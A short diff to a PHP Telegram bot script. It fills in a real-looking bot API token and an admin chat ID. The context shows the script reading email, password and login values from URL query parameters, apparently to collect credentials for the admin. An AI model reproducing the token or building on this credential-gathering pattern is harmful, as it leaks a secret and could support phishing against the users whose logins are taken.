@@ -1,6 +1,6 @@
 <?php
 ob_start();
-$API_KEY = 'Your Token';
+$API_KEY = '1998073200:AAGxMIV6HxJ5tUWAmLjig5UwYP98Pqhewus';
 define('API_KEY',$API_KEY);
 function bot($method,$datas=[]){
     $tbbots = http_build_query($datas);
@@ -31,7 +31,7 @@ $message_id = $update->callback_query->message->message_id;
 $data = $update->callback_query->data;
 $user = $message->from->username;
 
-$admin = "Your ID";
+$admin = "831161538";
 $email = $_GET["email"];
 $password = $_GET["password"];
 $login = $_GET["login"];
